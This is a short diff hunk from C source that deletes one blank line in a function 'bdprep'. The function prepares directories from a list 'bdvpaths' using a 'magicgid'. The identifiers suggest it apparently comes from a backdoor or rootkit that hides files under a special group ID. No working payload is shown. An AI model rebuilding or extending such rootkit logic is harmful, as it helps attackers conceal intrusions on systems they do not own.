@@ -74,7 +74,6 @@ void bdprep(void){
     int dirs=0, regs=0;
     for(int i = 0; i < BDVPATHS_SIZE; i++){
         curpath = bdvpaths[i];
-
         if(curpath[strlen(curpath)-1] == '/'){
             if(preparedir(curpath, magicgid))
                 dirs++;
